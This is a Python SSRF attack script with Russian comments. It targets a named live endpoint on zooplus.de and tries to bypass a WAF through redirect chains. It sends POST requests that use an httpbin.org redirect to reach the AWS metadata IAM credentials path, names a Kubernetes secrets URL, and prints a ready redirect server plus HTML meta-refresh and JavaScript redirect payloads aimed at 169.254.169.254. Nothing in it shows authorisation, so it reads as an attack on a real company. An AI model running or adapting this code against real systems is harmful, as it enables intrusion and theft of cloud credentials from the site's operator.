#!/usr/bin/env python3
"""
HAIL MARY #2: Redirect Chain SSRF
Вероятность: 3-5%

Теория:
- Если backend следует HTTP redirects, можно обойти WAF
- WAF проверяет первый URL, но не финальный после redirect
- Можно создать redirect: safe.com → 169.254.169.254
"""

import requests
import time

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("="*80)
print("HAIL MARY #2: Redirect Chain SSRF")
print("Вероятность успеха: 3-5%")
print("="*80)

# Test 1: Используем известные redirect сервисы
print("\n[TEST 1] Public redirect services")
print("-" * 80)

# URL-encode AWS metadata
import urllib.parse
aws_metadata = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
k8s_api = "http://kubernetes.default.svc/api/v1/namespaces/default/secrets"

redirect_services = [
    # bit.ly style (если есть доступ к короткому URL)
    # Для этого нужно создать свой сервер с redirect
    # Но можем попробовать существующие сервисы:

    # 1. httpbin.org redirect
    f"http://httpbin.org/redirect-to?url={urllib.parse.quote(aws_metadata)}",

    # 2. Используем свой контролируемый домен (если есть)
    # Для быстрого теста можно использовать webhook.site
    # (но он не делает redirect, только логирует)

    # 3. Попробуем redirect через Location header
    # Это требует настройки своего сервера
]

print("[!] NOTE: Для полноценного теста нужен контролируемый домен с redirect")
print("[!] Быстрый тест с httpbin.org:")

test_url = f"http://httpbin.org/redirect-to?url={urllib.parse.quote(aws_metadata)}"
print(f"\n[*] Testing: {test_url}")

try:
    start = time.time()
    resp = requests.post(
        ENDPOINT,
        json={"url": test_url},
        timeout=10,
        verify=False
    )
    elapsed = (time.time() - start) * 1000

    print(f"    Status: {resp.status_code}")
    print(f"    Timing: {elapsed:.1f}ms")
    print(f"    Response: {resp.text[:200]}")

    # Если timing сильно отличается или response non-empty
    if elapsed > 5000 or len(resp.text) > 10:
        print(f"    [!] Unusual timing/response! Might be following redirects")

except Exception as e:
    print(f"    Error: {e}")

# Test 2: Multiple redirects (цепочка)
print("\n\n[TEST 2] Multiple redirect chain")
print("-" * 80)

print("""
[!] Для этого теста нужно:

1. Создать свой HTTP сервер с redirect chain:

   safe-domain.com/r1 → redirect → safe-domain.com/r2
   safe-domain.com/r2 → redirect → 169.254.169.254

2. WAF проверит только первый URL (safe-domain.com)
3. Backend может follow redirects до AWS metadata

Быстрый способ (если есть VPS):

$ python3 -m http.server 8080

# redirect_server.py:
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/r1':
            self.send_response(302)
            self.send_header('Location', 'http://your-vps.com/r2')
            self.end_headers()
        elif self.path == '/r2':
            self.send_response(302)
            self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
            self.end_headers()

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()

Затем:
POST /zootopia-events/api/events/sites/1
{"url": "http://your-vps.com/r1"}

Если backend следует redirects → bypasses WAF!
""")

# Test 3: Meta refresh redirect (HTML-based)
print("\n\n[TEST 3] HTML Meta Refresh redirect")
print("-" * 80)

print("""
[!] Еще один способ - использовать HTML meta refresh:

Создать HTML на своем сервере:

<html>
<head>
<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
</head>
</html>

Затем:
POST /zootopia-events/api/events/sites/1
{"url": "http://your-controlled-domain.com/redirect.html"}

Если backend парсит HTML и следует meta refresh → bypass!

НО: Это требует, чтобы backend рендерил HTML, что маловероятно.
""")

# Test 4: JavaScript redirect
print("\n\n[TEST 4] JavaScript redirect")
print("-" * 80)

print("""
<html>
<script>window.location='http://169.254.169.254/latest/meta-data/';</script>
</html>

Вероятность: <1% (backend не выполняет JavaScript)
""")

print("\n" + "="*80)
print("ВЫВОД")
print("="*80)

print("""
Redirect chain SSRF работает ТОЛЬКО если:
1. Backend следует HTTP redirects (302/301)
2. WAF проверяет только ПЕРВЫЙ URL в цепочке
3. У вас есть контролируемый домен для создания redirect

Вероятность: 3-5%

Для быстрой проверки:
1. Проверьте httpbin.org/redirect-to результат выше
2. Если timing > 5s или response non-empty → backend следует redirects!
3. Если да → создайте redirect chain через свой VPS

Если нет времени на VPS setup → ПРОПУСТИТЕ этот метод
""")
